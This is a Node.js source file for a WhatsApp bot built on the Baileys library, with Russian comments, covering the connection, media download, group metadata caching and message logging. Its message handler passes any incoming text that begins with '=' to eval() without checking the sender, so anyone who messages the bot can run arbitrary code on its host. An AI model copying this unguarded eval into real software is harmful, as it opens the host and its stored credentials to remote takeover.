const { 
  DisconnectReason, 
  useMultiFileAuthState, 
  makeInMemoryStore, 
  downloadContentFromMessage, 
  getContentType,
  jidDecode
} = require("@whiskeysockets/baileys");
const util = require('util');
const makeWASocket = require("@whiskeysockets/baileys").default;
const pino = require('pino');
const colors = require('colors');
let requestInProgress = new Set();
const NodeCache = require('node-cache');
const groupMetadataCache = new NodeCache({ stdTTL: 60, checkperiod: 120 });
const { smsg } = require('../index')

// Логика подключения
async function connectionLogic() {
  const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
  const { state, saveCreds } = await useMultiFileAuthState("lib/system/auth_info_baileys");
 
  const Void = makeWASocket({
    printQRInTerminal: true,
    auth: state,
  });

  Void.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
        const decode = jidDecode(jid) || {};
        return decode.user && decode.server && `${decode.user}@${decode.server}` || jid;
    } else return jid;
  };

  Void.downloadMediaMessage = async (message) => {
    const mime = (message.msg || message).mimetype || '';
    const messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(message, messageType);
    
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    return buffer;
  };

  // Получение метаданных группы
  Void.metadataGroup = async (chatId) => {
    if (chatId.endsWith('@g.us')) {
      if (requestInProgress.has(chatId)) return;
      
      if (!groupMetadataCache.has(chatId)) {
        requestInProgress.add(chatId);
        const metadata = await Void.groupMetadata(chatId);
        let metadataCode;
        try {
          metadataCode = await Void.groupInviteCode(chatId);
        } catch {
          metadataCode = undefined;
        }

        metadata.inviteCode = metadataCode;
        groupMetadataCache.set(chatId, metadata);
        requestInProgress.delete(chatId);
      }

      return groupMetadataCache.get(chatId);
    } else {
      return 'privateChat';
    }
  };

  // Обработчик обновления соединения
  Void.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, qr } = update || {};
    if (qr) console.log(qr);

    if (connection === "close") {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      if (shouldReconnect) connectionLogic();
    }
  });

  // Обработчик обновления сообщений
  Void.ev.on("messages.upsert", async (chatUpdate) => {
    try {
        const mek = chatUpdate.messages[0];
        const botNumber = await Void.decodeJid(Void.user.id);

        mek.message = mek.message?.ephemeralMessage?.message || mek.message;
        const citel = await smsg(Void, JSON.parse(JSON.stringify(mek)), store);
        citel.budy = typeof citel.text === "string" ? citel.text : false;
        if (citel.isBaileys) return
        if (citel.budy.startsWith('=')) {
            try {
                const result = eval(citel.budy.slice(1).trim());
                await citel.reply(util.format(result));
            } catch (err) {
                await citel.reply(util.format(err));
            }
        }

        const groupMetadata = await Void.metadataGroup(citel.chat);
        if (groupMetadata) citel.gName = groupMetadata.subject;
        console.log(colors.yellow(`Группа: ${citel.gName || 'Личное сообщение'}\nЧат: ${citel.chat}\nОтправитель: ${citel.sender === 'unknown' ? botNumber : citel.sender}\nСообщение: ${citel.budy}\n`));
    } catch (error) {
        console.error("Ошибка в обработке сообщения:", error);
    }
  });

  

  // Обновление учетных данных
  Void.ev.on("creds.update", saveCreds);
}

connectionLogic();
